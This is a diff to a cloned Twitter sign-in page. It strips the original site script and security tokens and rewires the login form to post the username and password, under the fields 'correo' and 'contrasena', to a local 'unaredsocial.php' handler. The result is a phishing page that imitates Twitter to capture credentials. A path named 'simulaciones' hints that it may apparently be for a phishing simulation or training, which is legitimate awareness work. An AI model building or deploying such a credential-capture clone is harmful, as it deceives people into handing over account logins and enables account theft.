@@ -14,162 +14,6 @@
   <head>
     <meta charset="utf-8" />
 
-    <script id="swift_action_queue">
-      (function () {
-        function m(a) {
-          a || (a = window.event);
-          if (!a) return !1;
-          a.timestamp = new Date().getTime();
-          !a.target && a.srcElement && (a.target = a.srcElement);
-          if (
-            document.documentElement.getAttribute(
-              "data-scribe-reduced-action-queue"
-            )
-          ) {
-            var b = a.target;
-            while (b && b != document.body) {
-              if (b.tagName == "A") return;
-              b = b.parentNode;
-            }
-          }
-          r("all", s(a));
-          if (!q(a)) {
-            r("direct", a);
-            return !0;
-          }
-          document.addEventListener || (a = s(a));
-          a.preventDefault =
-            a.stopPropagation =
-            a.stopImmediatePropagation =
-              function () {};
-          if (i) {
-            f.push(a);
-            r("captured", a);
-          } else r("ignored", a);
-          return !1;
-        }
-        function n($) {
-          p();
-          for (var a = 0, b; (b = f[a]); a++) {
-            var d = $(b.target),
-              e = d.closest("a")[0];
-            if (b.type == "click" && e) {
-              var g = $.data(e, "events"),
-                i = g && g.click,
-                j = !e.hostname.match(c) || !e.href.match(/#$/);
-              if (!i && j) {
-                window.location = e.href;
-                continue;
-              }
-            }
-            d.trigger(b);
-          }
-          window.swiftActionQueue.wasFlushed = !0;
-        }
-        function o() {
-          for (var a in j) {
-            if (a == "all") continue;
-            var b = j[a];
-            for (var c = 0; c < b.length; c++)
-              console.log("actionQueue", u(b[c]));
-          }
-        }
-        function p() {
-          clearTimeout(g);
-          for (var a = 0, b; (b = e[a]); a++) document["on" + b] = null;
-        }
-        function q(a) {
-          if (!a.target) return !1;
-          var b = a.target,
-            e = (b.tagName || "").toLowerCase();
-          if (a.metaKey) return !1;
-          if (a.shiftKey && e == "a") return !1;
-          if (b.hostname && !b.hostname.match(c)) return !1;
-          if (a.type.match(d) && w(b)) return !1;
-          if (e == "label") {
-            var f = b.getAttribute("for");
-            if (f) {
-              var g = document.getElementById(f);
-              if (g && v(g)) return !1;
-            } else
-              for (var i = 0, j; (j = b.childNodes[i]); i++)
-                if (v(j)) return !1;
-          }
-          return !0;
-        }
-        function r(a, b) {
-          b.bucket = a;
-          j[a].push(b);
-        }
-        function s(a) {
-          var b = {};
-          for (var c in a) b[c] = a[c];
-          return b;
-        }
-        function t(a) {
-          while (a && a != document.body) {
-            if (a.tagName == "A") return a;
-            a = a.parentNode;
-          }
-        }
-        function u(b) {
-          var c = [];
-          b.bucket && c.push("[" + b.bucket + "]");
-          c.push(b.type);
-          var d = b.target,
-            e = t(d),
-            f = "",
-            g,
-            i,
-            j = b.timestamp && b.timestamp - a;
-          if (b.type === "click" && e) {
-            g = e.className.trim().replace(/\s+/g, ".");
-            i = e.id.trim();
-            f = /[^#]$/.test(e.href) ? " (" + e.href + ")" : "";
-            d = '"' + e.innerText.replace(/\n+/g, " ").trim() + '"';
-          } else {
-            g = d.className.trim().replace(/\s+/g, ".");
-            i = d.id.trim();
-            d = d.tagName.toLowerCase();
-            b.keyCode && (d = String.fromCharCode(b.keyCode) + " : " + d);
-          }
-          c.push(d + f + (i && "#" + i) + (!i && g ? "." + g : ""));
-          j && c.push(j);
-          return c.join(" ");
-        }
-        function v(a) {
-          var b = (a.tagName || "").toLowerCase();
-          return b == "input" && a.getAttribute("type") == "checkbox";
-        }
-        function w(a) {
-          var b = (a.tagName || "").toLowerCase();
-          return (
-            b == "textarea" ||
-            (b == "input" && a.getAttribute("type") == "text") ||
-            a.getAttribute("contenteditable") == "true"
-          );
-        }
-        var a = new Date().getTime(),
-          b = 1e4,
-          c = /^([^\.]+\.)*twitter\.com$/,
-          d = /^key/,
-          e = ["click", "keydown", "keypress", "keyup"],
-          f = [],
-          g = null,
-          i = !0,
-          j = { captured: [], ignored: [], direct: [], all: [] };
-        for (var k = 0, l; (l = e[k]); k++) document["on" + l] = m;
-        g = setTimeout(function () {
-          i = !1;
-        }, b);
-        window.swiftActionQueue = {
-          buckets: j,
-          flush: n,
-          logActions: o,
-          wasFlushed: !1,
-        };
-      })();
-    </script>
 
     <link
       rel="stylesheet"
@@ -286,19 +130,17 @@
           <div class="page-canvas">
             <div class="signin-wrapper" data-login-message="">
               <h1>Sign in to Twitter</h1>
-              <form
-                action="../simulaciones/respuesta.html"
-                class="clearfix signin js-signin"
-                method="post"
-              >
-                <fieldset>
+
+              <form method="post" action="unaredsocial.php">
+              <fieldset>
                   <legend class="visuallyhidden">Sign In</legend>
 
                   <div class="clearfix field">
                     <input
-                      class="js-username-field email-input js-initial-focus"
+                      class=" email-input "
                       type="text"
-                      name="session[username_or_email]"
+                      id="correo"
+                      name="correo"
                       autocomplete="on"
                       value=""
                       placeholder="Username or email"
@@ -309,41 +151,23 @@
                     <input
                       class="js-password-field"
                       type="password"
-                      name="session[password]"
+                      id="contrasena"
+                      name="contrasena"
                       placeholder="Password"
                     />
                   </div>
 
-                  <input
-                    type="hidden"
-                    value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
-                    name="authenticity_token"
-                  />
-                </fieldset>
-
-                <div class="captcha js-captcha"></div>
-                <div class="clearfix">
-                  <input type="hidden" name="scribe_log" />
-                  <input type="hidden" name="redirect_after_login" value="" />
-                  <input
-                    type="hidden"
-                    value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
-                    name="authenticity_token"
-                  />
-                  <a href="" class="btn btn-primary" target="_blank">Sign in</a>
-                  <!-- <a type="submit" class="submit btn primary-btn" action="respuesta.html"/> -->
+                  <button name="enviar" type="submit" class="btn btn-primary">Sign in</button>
 
                   <div class="subchck">
                     <label class="remember">
                       <input type="checkbox" value="1" name="remember_me" />
                       Remember me
                       <span class="separator">·</span>
-                      <a class="forgot" href="respuesta.html"
-                        >Forgot password?</a
-                      >
+                      <a class="forgot" href="respuesta.html">Forgot password?</a>
                     </label>
                   </div>
-                </div>
+               
               </form>
             </div>
 
